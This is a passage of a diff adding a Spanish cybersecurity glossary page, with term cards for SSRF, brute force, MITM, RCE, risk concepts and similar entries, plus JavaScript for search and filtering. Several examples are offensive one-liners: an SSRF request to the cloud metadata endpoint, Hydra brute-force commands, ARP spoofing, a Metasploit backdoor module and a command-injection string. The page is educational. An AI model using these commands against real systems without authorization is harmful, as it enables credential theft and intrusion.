+                explanation: "El servidor actúa como proxy sin saberlo, haciendo peticiones en nombre del atacante. Esto permite acceder a servicios internos no expuestos a internet (169.254.169.254 en AWS para metadata, puertos internos, servicios en localhost), escanear redes internas, y en algunos casos leer archivos locales mediante protocolos file://.",
+                example: `# AWS metadata
+http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/
+
+# Port scanning interno
+http://vulnerable.com/fetch?url=http://192.168.1.5:22`,
+                importance: "Permite pivotar desde una aplicación web externa hacia la red interna de la organización, acceder a servicios cloud metadata (robo de credenciales IAM), y en general expandir dramáticamente la superficie de ataque."
+            },
+            {
+    title: "Hash",
+    slug: "hash",
+    category: "Criptografía",
+    tags: ["criptografia", "password", "seguridad"],
+    definition: "Función criptográfica que convierte datos de entrada en una cadena de longitud fija, única para ese contenido.",
+    explanation: "Los hashes son deterministas y unidireccionales, lo que significa que el mismo input genera siempre el mismo output, pero no es viable recuperar el input original. Se utilizan para almacenar contraseñas (junto con salt y algoritmos seguros como bcrypt) y para verificar la integridad de archivos. Algoritmos antiguos como MD5 o SHA1 son vulnerables a colisiones y no deben usarse en contextos críticos.",
+    example: `# Generar hash MD5
+echo -n "password" | md5sum
+
+# Verificar integridad de archivo
+sha256sum archivo.iso`,
+    importance: "Fundamental en seguridad para proteger credenciales y garantizar que los datos no han sido alterados. Un mal uso puede comprometer completamente la seguridad de un sistema."
+},
+{
+    title: "Brute Force",
+    slug: "brute-force",
+    category: "Ataques",
+    tags: ["ataque", "password", "credenciales"],
+    definition: "Ataque que consiste en probar sistemáticamente múltiples combinaciones de credenciales hasta encontrar la correcta.",
+    explanation: "Puede realizarse mediante fuerza bruta pura (todas las combinaciones posibles) o mediante diccionarios de contraseñas comunes. Herramientas como Hydra permiten automatizar estos ataques contra múltiples servicios. Su efectividad depende de la complejidad de la contraseña y de medidas defensivas como rate limiting, CAPTCHA o bloqueo de cuentas.",
+    example: `# Ataque SSH con Hydra
+hydra -l admin -P rockyou.txt ssh://192.168.1.100
+
+# Ataque HTTP POST
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`,
+    importance: "Sigue siendo uno de los métodos más efectivos contra servicios mal protegidos. Es clave entenderlo tanto para ataques como para implementar defensas adecuadas."
+},
+{
+    title: "Firewall",
+    slug: "firewall",
+    category: "Defensivas",
+    tags: ["redes", "seguridad", "defensa"],
+    definition: "Sistema de seguridad que monitoriza y controla el tráfico de red según reglas definidas.",
+    explanation: "Actúa como una barrera entre redes confiables y no confiables, filtrando paquetes en función de IP, puertos, protocolos o incluso comportamiento. Existen firewalls de red y de host, así como NGFW que incluyen inspección profunda de paquetes (DPI) y detección de amenazas avanzadas.",
+    example: `# Permitir HTTP/HTTPS
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Bloquear todo lo demás
+iptables -A INPUT -j DROP`,
+    importance: "Es una de las primeras líneas de defensa en cualquier infraestructura. Una mala configuración puede dejar servicios críticos expuestos."
+},
+{
+    title: "VPN",
+    slug: "vpn",
+    category: "Redes",
+    tags: ["redes", "privacidad", "seguridad"],
+    definition: "Tecnología que crea un túnel cifrado entre un cliente y un servidor a través de una red pública.",
+    explanation: "Permite proteger la confidencialidad e integridad del tráfico, ocultando la IP real del usuario. Es ampliamente utilizada para acceso remoto seguro a redes corporativas y para proteger comunicaciones en redes inseguras. Protocolos comunes incluyen OpenVPN, WireGuard e IPsec.",
+    example: `# Conexión a VPN OpenVPN
+openvpn --config cliente.ovpn`,
+    importance: "Esencial para proteger comunicaciones en entornos no confiables y garantizar acceso seguro a recursos internos."
+},
+{
+    title: "Malware",
+    slug: "malware",
+    category: "Malware",
+    tags: ["malware", "ataque"],
+    definition: "Software diseñado para infiltrarse, dañar o comprometer sistemas sin el conocimiento del usuario.",
+    explanation: "Incluye múltiples categorías como virus, troyanos, ransomware, spyware o rootkits. Puede propagarse mediante phishing, descargas maliciosas o explotación de vulnerabilidades. Sus objetivos van desde el robo de información hasta el control total del sistema.",
+    example: `# Ejemplo típico
+Archivo adjunto en correo phishing que instala un troyano`,
+    importance: "Es el principal vector de ataque en el mundo real. Entender sus tipos y funcionamiento es clave tanto en defensa como en análisis forense."
+},
+{
+    title: "Exploit",
+    slug: "exploit",
+    category: "Conceptos",
+    tags: ["vulnerabilidad", "explotacion"],
+    definition: "Código o técnica que aprovecha una vulnerabilidad para ejecutar acciones no autorizadas en un sistema.",
+    explanation: "Un exploit transforma una vulnerabilidad en un ataque real. Puede permitir ejecución de código, escalación de privilegios o acceso no autorizado. Se clasifican en local, remoto, client-side, entre otros, y suelen integrarse en frameworks como Metasploit.",
+    example: `# Buscar exploit
+searchsploit vsftpd
+
+# Uso en Metasploit
+use exploit/unix/ftp/vsftpd_234_backdoor`,
+    importance: "Es el elemento que convierte un fallo en una amenaza real. Sin exploit, una vulnerabilidad no siempre es explotable."
+},
+{
+    title: "Sniffing",
+    slug: "sniffing",
+    category: "Redes",
+    tags: ["redes", "ataque", "analisis"],
+    definition: "Técnica de captura e inspección de paquetes que circulan por una red.",
+    explanation: "Permite analizar tráfico en tiempo real o almacenado. Si los datos no están cifrados, pueden exponerse credenciales, cookies o información sensible. Se usa tanto para análisis legítimo como en ataques.",
+    example: `# Filtro en Wireshark
+http contains "password"`,
+    importance: "Destaca la importancia del cifrado en comunicaciones. Sin HTTPS, los datos pueden ser fácilmente interceptados."
+},
+{
+    title: "MITM",
+    slug: "mitm",
+    category: "Ataques",
+    tags: ["ataque", "redes"],
+    definition: "Ataque en el que un atacante intercepta la comunicación entre dos partes.",
+    explanation: "El atacante puede espiar, modificar o redirigir el tráfico sin que las partes lo detecten. Técnicas comunes incluyen ARP spoofing, DNS spoofing o rogue access points.",
+    example: `# ARP spoofing
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1`,
+    importance: "Permite comprometer la confidencialidad e integridad de la comunicación, especialmente en redes inseguras."
+},
+{
+    title: "JWT",
+    slug: "jwt",
+    category: "Web",
+    tags: ["auth", "token"],
+    definition: "Token basado en JSON utilizado para transmitir información autenticada entre cliente y servidor.",
+    explanation: "Está compuesto por header, payload y signature. Se usa ampliamente en autenticación de APIs. Si la firma no se valida correctamente o se usan algoritmos inseguros, puede ser manipulado por atacantes.",
+    example: `# Header típico
+{"alg":"HS256","typ":"JWT"}`,
+    importance: "Muy común en aplicaciones modernas. Una mala implementación puede permitir acceso no autorizado."
+},
+{
+    title: "Fuzzing",
+    slug: "fuzzing",
+    category: "Técnicas",
+    tags: ["testing", "ataque"],
+    definition: "Técnica que consiste en enviar datos aleatorios o malformados para descubrir fallos en una aplicación.",
+    explanation: "Se utiliza para identificar vulnerabilidades como buffer overflows, errores de validación o comportamientos inesperados. Herramientas como Burp Intruder permiten automatizar el proceso.",
+    example: `# Fuzzing con ffuf
+ffuf -u http://target/FUZZ -w wordlist.txt`,
+    importance: "Permite descubrir vulnerabilidades que no son evidentes mediante análisis manual."
+},
+{
+    title: "RCE",
+    slug: "rce",
+    category: "Vulnerabilidad",
+    tags: ["explotacion"],
+    definition: "Vulnerabilidad que permite a un atacante ejecutar código arbitrario en un sistema remoto.",
+    explanation: "Es una de las vulnerabilidades más críticas, ya que proporciona control total sobre el sistema afectado. Puede derivarse de fallos en validación de inputs, deserialización insegura o vulnerabilidades en software.",
+    example: `# Ejecución remota
+; whoami`,
+    importance: "Implica compromiso completo del sistema, siendo uno de los objetivos principales en pentesting."
+}, {
+    title: "API",
+    slug: "api",
+    category: "Conceptos",
+    tags: ["web", "backend"],
+    definition: "Interfaz que permite la comunicación entre diferentes sistemas o aplicaciones.",
+    explanation: "Define cómo interactúan los componentes de software mediante peticiones y respuestas, generalmente usando HTTP/HTTPS. Las APIs modernas suelen ser REST o GraphQL y son un objetivo frecuente en pentesting debido a errores de autenticación o validación.",
+    example: `GET /api/users
+POST /api/login`,
+    importance: "Son el núcleo de muchas aplicaciones actuales, y una mala implementación puede exponer funcionalidades críticas."
+},
+{
+    title: "Rate Limiting",
+    slug: "rate-limiting",
+    category: "Defensivas",
+    tags: ["defensa", "web"],
+    definition: "Mecanismo que limita el número de peticiones que un usuario puede realizar en un periodo de tiempo.",
+    explanation: "Se utiliza para prevenir abusos como ataques de fuerza bruta, scraping o DoS. Puede implementarse por IP, usuario o token, y suele combinarse con bloqueos temporales o CAPTCHA.",
+    example: `Máximo 5 intentos de login por minuto`,
+    importance: "Reduce significativamente el impacto de ataques automatizados y protege recursos del sistema."
+},
+{
+    title: "CVE",
+    slug: "cve",
+    category: "Conceptos",
+    tags: ["vulnerabilidad"],
+    definition: "Identificador único asignado a vulnerabilidades de seguridad conocidas públicamente.",
+    explanation: "Permite estandarizar la referencia a fallos de seguridad y facilita su seguimiento. Cada CVE incluye detalles técnicos, impacto y referencias a parches o exploits disponibles.",
+    example: `CVE-2021-44228 (Log4Shell)`,
+    importance: "Es clave para la gestión de vulnerabilidades y priorización de parches en entornos reales."
+},
+{
+    title: "Searchsploit",
+    slug: "searchsploit",
+    category: "Herramientas",
+    tags: ["herramientas", "exploits"],
+    definition: "Herramienta que permite buscar exploits locales en la base de datos de Exploit-DB.",
+    explanation: "Facilita la identificación rápida de exploits disponibles para versiones específicas de software detectadas durante el reconocimiento. Se integra directamente en sistemas como Kali Linux.",
+    example: `searchsploit apache 2.4.49`,
+    importance: "Acelera la fase de explotación al permitir localizar rápidamente código reutilizable."
+},
+{
+    title: "Enumeration",
+    slug: "enumeration",
+    category: "Reconocimiento",
+    tags: ["reconocimiento"],
+    definition: "Proceso de obtención de información detallada sobre servicios y sistemas tras el escaneo inicial.",
+    explanation: "A diferencia del reconocimiento básico, se centra en identificar usuarios, recursos compartidos, versiones exactas y configuraciones específicas. Es clave para encontrar vectores de ataque reales.",
+    example: `enum4linux -a 192.168.1.100
+rpcclient -U "" 192.168.1.100`,
+    importance: "Permite pasar de información general a datos explotables, siendo una fase crítica en pentesting."
+},
+{
+    title: "Cookie",
+    slug: "cookie",
+    category: "Web",
+    tags: ["web", "auth"],
+    definition: "Pequeño dato almacenado en el navegador que mantiene información de sesión entre peticiones.",
+    explanation: "Las cookies permiten identificar usuarios y mantener sesiones activas. Si no están protegidas (HttpOnly, Secure), pueden ser robadas mediante ataques como XSS, permitiendo secuestro de sesión.",
+    example: `Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure`,
+    importance: "Son fundamentales en autenticación web, pero también un objetivo clave para atacantes."
+},
+{
+    title: "Session",
+    slug: "session",
+    category: "Web",
+    tags: ["auth"],
+    definition: "Estado mantenido entre cliente y servidor para identificar a un usuario autenticado.",
+    explanation: "Se gestiona normalmente mediante cookies o tokens. Una mala gestión puede permitir ataques como session fixation o hijacking.",
+    example: `Usuario inicia sesión y recibe un session ID`,
+    importance: "Es clave para controlar el acceso a recursos protegidos."
+},
+{
+    title: "DoS",
+    slug: "dos",
+    category: "Ataques",
+    tags: ["ataque"],
+    definition: "Ataque que busca hacer un servicio inaccesible saturando sus recursos.",
+    explanation: "Puede realizarse enviando un gran número de peticiones o explotando vulnerabilidades que consumen recursos. No implica necesariamente múltiples máquinas.",
+    example: `Enviar miles de peticiones HTTP a un servidor`,
+    importance: "Puede causar interrupciones graves en servicios críticos."
+},
+{
+    title: "DDoS",
+    slug: "ddos",
+    category: "Ataques",
+    tags: ["ataque"],
+    definition: "Ataque distribuido que utiliza múltiples sistemas para saturar un servicio.",
+    explanation: "Se realiza mediante botnets que generan tráfico masivo desde diferentes ubicaciones, dificultando su mitigación. Puede dirigirse a aplicaciones, redes o infraestructuras completas.",
+    example: `Botnet enviando tráfico a una web objetivo`,
+    importance: "Es mucho más difícil de mitigar que un DoS y puede tumbar grandes servicios."
+},
+{
+    title: "Zero-Day",
+    slug: "zero-day",
+    category: "Vulnerabilidad",
+    tags: ["vulnerabilidad", "explotacion"],
+    definition: "Vulnerabilidad desconocida públicamente y sin parche disponible.",
+    explanation: "Los atacantes pueden explotarla antes de que el fabricante tenga conocimiento o solución. Suelen ser altamente valiosas y utilizadas en ataques avanzados.",
+    example: `Exploit desconocido usado en ataques dirigidos`,
+    importance: "Representa una de las amenazas más críticas debido a la falta de defensa inmediata."
+},
+{
+    title: "Defense in Depth",
+    slug: "defense-in-depth",
+    category: "Conceptos",
+    tags: ["defensa"],
+    definition: "Estrategia de seguridad basada en múltiples capas de protección.",
+    explanation: "Si una capa falla (por ejemplo, firewall), otras siguen protegiendo el sistema (IDS, autenticación, monitoreo). Reduce la probabilidad de compromiso total.",
+    example: `Firewall + IDS + autenticación + monitoreo`,
+    importance: "Es un principio clave en el diseño de sistemas seguros."
+}, {
+    title: "Threat",
+    slug: "threat",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Cualquier entidad o evento con capacidad de causar daño a un sistema, organización o activo.",
+    explanation: "Una amenaza puede ser un atacante externo, un empleado interno, malware o incluso un desastre natural. No implica que el ataque ocurra, sino que existe la posibilidad. En ciberseguridad, las amenazas se analizan junto con vulnerabilidades para evaluar el riesgo real.",
+    example: `Amenazas comunes:
+- Hacker intentando acceso no autorizado
+- Malware infectando sistemas
+- Empleado filtrando datos internos`,
+    importance: "Es la base del análisis de riesgos. Sin amenazas, no existe riesgo, y entenderlas es clave en cualquier evaluación de seguridad."
+},
+{
+    title: "Vulnerability",
+    slug: "vulnerability",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Debilidad en un sistema que puede ser explotada por una amenaza.",
+    explanation: "Las vulnerabilidades pueden ser técnicas (software desactualizado, mala configuración) o humanas (errores de usuario). Por sí solas no causan daño, pero combinadas con una amenaza pueden derivar en un incidente de seguridad.",
+    example: `Ejemplos:
+- Software sin parchear (CVE conocido)
+- Contraseñas débiles
+- Permisos mal configurados`,
+    importance: "Son el punto de entrada de los ataques. Identificarlas y corregirlas es una de las tareas principales en ciberseguridad."
+},
+{
+    title: "Risk",
+    slug: "risk",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Probabilidad de que una amenaza explote una vulnerabilidad causando impacto negativo.",
+    explanation: "El riesgo se calcula combinando la probabilidad de explotación y el impacto que tendría. No todas las vulnerabilidades tienen el mismo riesgo: una crítica en un sistema expuesto es más prioritaria que una en un sistema aislado.",
+    example: `Riesgo = Probabilidad × Impacto
+
+Ejemplo:
+- Alta probabilidad + alto impacto → Riesgo crítico
+- Baja probabilidad + bajo impacto → Riesgo bajo`,
+    importance: "Permite priorizar esfuerzos de seguridad y decidir qué vulnerabilidades deben corregirse primero."
+},
+{
+    title: "Asset",
+    slug: "asset",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Cualquier recurso de valor para una organización que debe ser protegido.",
+    explanation: "Los activos incluyen datos, sistemas, aplicaciones, infraestructura y personas. No todos tienen el mismo valor: una base de datos de clientes es más crítica que un equipo de pruebas. Identificar activos es el primer paso en cualquier estrategia de seguridad.",
+    example: `Ejemplos:
+- Base de datos de clientes
+- Servidor de producción
+- Credenciales de acceso`,
+    importance: "Toda la seguridad gira en proteger los activos. Sin identificarlos correctamente, no se puede aplicar una estrategia eficaz."
+},
+{
+    title: "Attack Surface",
+    slug: "attack-surface",
+    category: "Conceptos",
+    tags: ["riesgo", "interview"],
+    definition: "Conjunto total de puntos de entrada que un atacante puede utilizar para comprometer un sistema.",
+    explanation: "Incluye puertos abiertos, aplicaciones web, APIs, servicios expuestos y cualquier interacción posible con el sistema. Cuanto mayor es la superficie de ataque, mayor es la probabilidad de encontrar vulnerabilidades.",
+    example: `Ejemplo de superficie de ataque:
+- Web pública
+- API expuesta
+- Puerto SSH abierto
+- Servicios internos accesibles`,
+    importance: "Reducir la superficie de ataque es una de las formas más efectivas de mejorar la seguridad."
+},
+{
+    title: "Least Privilege",
+    slug: "least-privilege",
+    category: "Conceptos",
+    tags: ["defensa", "interview"],
+    definition: "Principio de seguridad que establece que un usuario o sistema debe tener solo los permisos estrictamente necesarios.",
+    explanation: "Evita que usuarios o procesos tengan más privilegios de los necesarios, reduciendo el impacto de un posible compromiso. Es fundamental para prevenir escalaciones de privilegios y limitar el daño en caso de ataque.",
+    example: `Ejemplo:
+- Usuario sin permisos de administrador
+- Servicio que solo puede acceder a su propia base de datos`,
+    importance: "Reduce drásticamente el impacto de ataques y es una práctica esencial en entornos seguros."
+},
+{
+    title: "OWASP Top 10",
+    slug: "owasp-top-10",
+    category: "Metodologías",
+    tags: ["metodologia", "web", "interview"],
+    definition: "Lista de las vulnerabilidades web más críticas y comunes publicada por OWASP.",
+    explanation: "Sirve como referencia para desarrolladores y pentesters para identificar riesgos en aplicaciones web. Incluye categorías como Injection, Broken Access Control, Security Misconfiguration o XSS.",
+    example: `Ejemplos:
+- Injection (SQLi)
+- Broken Authentication
+- Cross-Site Scripting (XSS)`,
+    importance: "Es un estándar en la industria y una referencia obligatoria en entrevistas de ciberseguridad."
+},
+{
+    title: "Kill Chain",
+    slug: "kill-chain",
+    category: "Metodologías",
+    tags: ["metodologia", "interview"],
+    definition: "Modelo que describe las fases de un ataque desde el reconocimiento hasta la exfiltración.",
+    explanation: "Permite entender cómo actúan los atacantes paso a paso. Las fases incluyen: reconocimiento, weaponization, delivery, explotación, instalación, comando y control, y acciones sobre objetivos.",
+    example: `Fases:
+1. Reconocimiento
+2. Explotación
+3. Persistencia
+4. Lateral Movement
+5. Exfiltración`,
+    importance: "Ayuda a identificar en qué fase se encuentra un ataque y cómo detectarlo o detenerlo."
+},
+{
+    title: "Firewall",
+    slug: "firewall",
+    category: "Defensivas",
+    tags: ["redes", "defensa", "interview"],
+    definition: "Sistema de seguridad que filtra el tráfico de red según reglas definidas.",
+    explanation: "Puede ser hardware o software y opera permitiendo o bloqueando tráfico en función de IPs, puertos y protocolos. Los firewalls modernos incluyen inspección profunda de paquetes (DPI) y funcionalidades de detección de intrusiones.",
+    example: `Ejemplo:
+Permitir: puerto 80 y 443
+Bloquear: todo lo demás`,
+    importance: "Es la primera línea de defensa en redes y controla el acceso a los sistemas."
+},
+{
+    title: "VPN",
+    slug: "vpn",
+    category: "Redes",
+    tags: ["redes", "seguridad", "interview"],
+    definition: "Tecnología que crea un túnel cifrado para transmitir datos de forma segura sobre redes públicas.",
+    explanation: "Oculta la IP del usuario y protege la información mediante cifrado. Se utiliza para acceder de forma segura a redes corporativas o proteger comunicaciones en redes inseguras como WiFi público.",
+    example: `Ejemplo:
+Empleado accede a red corporativa desde casa mediante VPN`,
+    importance: "Protege la confidencialidad de los datos y es clave en entornos de trabajo remoto."
+},
+{
+    title: "Malware",
+    slug: "malware",
+    category: "Malware",
+    tags: ["malware", "ataque", "interview"],
+    definition: "Software malicioso diseñado para comprometer, dañar o explotar sistemas.",
+    explanation: "Incluye múltiples tipos como virus, troyanos, ransomware, spyware o rootkits. Puede robar información, tomar control del sistema o interrumpir operaciones. Es uno de los vectores de ataque más comunes.",
+    example: `Ejemplos:
+- Ransomware cifrando archivos
+- Spyware robando credenciales`,
+    importance: "Es la herramienta principal en muchos ataques reales y una amenaza constante para organizaciones."
+},
+{
+    title: "Backdoor",
+    slug: "backdoor",
+    category: "Malware",
+    tags: ["malware", "persistencia", "interview"],
+    definition: "Mecanismo oculto que permite acceso persistente a un sistema evitando los métodos de autenticación normales.",
+    explanation: "Puede ser instalado por atacantes tras comprometer un sistema o existir como fallo en el software. Permite mantener acceso continuo incluso después de reinicios o cambios de credenciales.",
+    example: `Ejemplo:
+Usuario oculto con privilegios de administrador`,
+    importance: "Permite a los atacantes mantener control a largo plazo sin ser detectados fácilmente."
+},
+{
+    title: "Sniffing",
+    slug: "sniffing",
+    category: "Redes",
+    tags: ["redes", "ataque", "interview"],
+    definition: "Intercepción y análisis del tráfico de red para obtener información.",
+    explanation: "Se realiza capturando paquetes en la red. Si el tráfico no está cifrado, puede revelar credenciales, cookies o datos sensibles. Herramientas como Wireshark facilitan este proceso.",
+    example: `Capturar tráfico HTTP y ver credenciales en texto plano`,
+    importance: "Demuestra la importancia del cifrado y es una técnica común en auditorías y ataques."
+},
+{
+    title: "MITM",
+    slug: "mitm",
+    category: "Ataques",
+    tags: ["ataque", "redes", "interview"],
+    definition: "Ataque en el que un atacante intercepta y potencialmente modifica la comunicación entre dos partes.",
+    explanation: "El atacante se posiciona entre cliente y servidor sin que lo sepan, pudiendo espiar o alterar datos. Es común en redes WiFi públicas o mediante técnicas como ARP spoofing.",
+    example: `Interceptar tráfico entre usuario y web en WiFi público`,
+    importance: "Compromete la confidencialidad e integridad de la comunicación."
+}
+           
+        ];
+
+        // Estado global
+        let selectedTags = new Set();
+        let searchQuery = '';
+
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeTagsDropdown();
+            renderContent();
+            
+            // Event listeners
+            document.getElementById('searchInput').addEventListener('input', (e) => {
+                searchQuery = e.target.value.toLowerCase();
+                renderContent();
+            });
+
+            document.getElementById('filterBtn').addEventListener('click', toggleFilterDropdown);
+
+            // Close dropdown cuando se hace click fuera
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('#filterBtn') && !e.target.closest('#filterDropdown')) {
+                    document.getElementById('filterDropdown').classList.remove('active');
+                }
+            });
+        });
+
+        // Inicializar tags en el dropdown
+        function initializeTagsDropdown() {
+            const allTags = new Set();
+            terms.forEach(term => term.tags.forEach(tag => allTags.add(tag)));
+            
+            const tagsGrid = document.getElementById('tagsGrid');
+            [...allTags].sort().forEach(tag => {
+                const tagEl = document.createElement('div');
+                tagEl.className = 'tag-option';
+                tagEl.textContent = `#${tag}`;
+                tagEl.onclick = () => toggleTag(tag, tagEl);
+                tagsGrid.appendChild(tagEl);
+            });
+        }
+
+        // Toggle dropdown
+        function toggleFilterDropdown() {
+            const dropdown = document.getElementById('filterDropdown');
+            const btn = document.getElementById('filterBtn');
+            dropdown.classList.toggle('active');
+            btn.classList.toggle('active');
+        }
+
+        // Toggle tag selection
+        function toggleTag(tag, element) {
+            if (selectedTags.has(tag)) {
+                selectedTags.delete(tag);
+                element.classList.remove('selected');
+            } else {
+                selectedTags.add(tag);
+                element.classList.add('selected');
+            }
+            updateFilterCount();
+            renderContent();
+        }
+
+        // Actualizar contador de filtros
+        function updateFilterCount() {
+            const count = document.getElementById('filterCount');
+            if (selectedTags.size > 0) {
+                count.textContent = selectedTags.size;
+                count.style.display = 'block';
+            } else {
+                count.style.display = 'none';
+            }
+        }
+
+        // Filtrar términos
+        function getFilteredTerms() {
+            return terms.filter(term => {
+                // Filtro de búsqueda
+                if (searchQuery) {
+                    const matches = 
+                        term.title.toLowerCase().includes(searchQuery) ||
+                        term.definition.toLowerCase().includes(searchQuery) ||
+                        term.explanation.toLowerCase().includes(searchQuery) ||
+                        term.tags.some(tag => tag.toLowerCase().includes(searchQuery));
+                    if (!matches) return false;
+                }
+                
+                // Filtro de tags
+                if (selectedTags.size > 0) {
+                    const hasAllTags = [...selectedTags].every(tag => term.tags.includes(tag));
+                    if (!hasAllTags) return false;
+                }
+                
+                return true;
+            });
+        }
+
+        // Renderizar contenido
+        function renderContent() {
+            const filtered = getFilteredTerms();
+            const container = document.getElementById('contentContainer');
+            
+            if (filtered.length === 0) {
+                container.innerHTML = `
+                    <div class="no-results">
+                        <div class="no-results-icon">🔍</div>
+                        <h3>No se encontraron resultados</h3>
+                        <p>Intenta ajustar tu búsqueda o filtros</p>
+                    </div>
+                `;
+                return;
+            }
+
+            // Agrupar por letra
+            const grouped = {};
+            filtered.forEach(term => {
+                const firstChar = term.title[0].toUpperCase();
+                const key = /[0-9]/.test(firstChar) ? '0-9' : firstChar;
+                if (!grouped[key]) grouped[key] = [];
+                grouped[key].push(term);
+            });
+
+            // Ordenar las keys
+            const sortedKeys = Object.keys(grouped).sort((a, b) => {
+                if (a === '0-9') return -1;
+                if (b === '0-9') return 1;
+                return a.localeCompare(b);
+            });
+
+            // Renderizar
+            container.innerHTML = sortedKeys.map(letter => `
+                <div class="letter-group">
+                    <div class="letter-header">${letter}</div>
+                    <div class="terms-grid">
+                        ${grouped[letter].map(term => renderTermCard(term)).join('')}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Renderizar tarjeta de término
+        function renderTermCard(term) {
+            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
+            return `
+                <div class="term-card" onclick="openModal('${term.slug}')">
+                    <div class="term-header">
+                        <div class="term-title">${term.title}</div>
+                        <div class="term-category-badge ${categoryClass}">${term.category}</div>
+                    </div>
+                    <div class="term-definition">${term.definition}</div>
+                    <div class="term-tags">
+                        ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
+                    </div>
+                </div>
+            `;
+        }
+
+        // Abrir modal
+        function openModal(slug) {
+            const term = terms.find(t => t.slug === slug);
+            if (!term) return;
+            
+            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
+            const modal = document.getElementById('termModal');
+            const modalBody = document.getElementById('modalBody');
+            
+            // Escapar HTML en ejemplos
+            const escapedExample = term.example
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+            
+            modalBody.innerHTML = `
+                <div class="modal-title">${term.title}</div>
+                <div class="term-category-badge ${categoryClass}" style="margin-bottom: 2rem;">${term.category}</div>
+                
+                <div class="info-box">
+                    <h3>Definición</h3>
+                    <p>${term.definition}</p>
+                </div>
+                
+                <div class="info-box">
+                    <h3>Explicación</h3>
+                    <p>${term.explanation}</p>
+                </div>
+                
+                <div class="info-box">
+                    <h3>Ejemplo</h3>
+                    <div class="code-block"><code>${escapedExample}</code></div>
+                </div>
+                
+                <div class="info-box">
+                    <h3>¿Por qué importa?</h3>
+                    <p>${term.importance}</p>
+                </div>
+                
+                <div class="term-tags">
+                    ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
+                </div>
+            `;
+            
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        // Cerrar modal
+        function closeModal() {
+            const modal = document.getElementById('termModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        // Cerrar con click fuera
+        document.getElementById('termModal').addEventListener('click', (e) => {
+            if (e.target.id === 'termModal') closeModal();
+        });
+
+        // Cerrar con ESC
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+    </script>
+</body>
+</html>
